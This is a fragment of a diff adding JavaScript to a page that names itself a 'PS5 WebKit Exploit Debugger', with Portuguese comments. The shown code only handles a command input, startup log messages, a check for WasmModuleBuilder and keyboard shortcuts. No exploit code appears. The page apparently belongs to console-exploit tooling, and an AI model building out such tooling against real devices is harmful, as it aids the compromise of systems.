+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        });
+        
+        // ============================================
+        // INICIALIZAÇÃO
+        // ============================================
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            log('🟢 Sistema de debug inicializado', 'success');
+            log('Versão: 1.0 - PS5 WebKit Exploit Debugger', 'info');
+            log('Pronto para executar comandos...', 'info');
+            
+            // Verificar se o wasm-module-builder.js está carregado
+            setTimeout(() => {
+                if (typeof WasmModuleBuilder === 'undefined') {
+                    log('⚠️ WasmModuleBuilder não detectado automaticamente', 'warning');
+                    log('Clique em "Testar WasmModuleBuilder" para carregar manualmente', 'info');
+                }
+            }, 1000);
+        });
+        
+        // Adicionar atalhos de teclado
+        document.addEventListener('keydown', function(e) {
+            // Ctrl + L para limpar console
+            if (e.ctrlKey && e.key === 'l') {
+                e.preventDefault();
+                clearConsole();
+            }
+            
+            // Foco no input de comando
+            if (e.key === '`' || e.key === '~') {
+                e.preventDefault();
+                document.getElementById('commandInput').focus();
+            }
+        });
     </script>
 </body>
 </html>
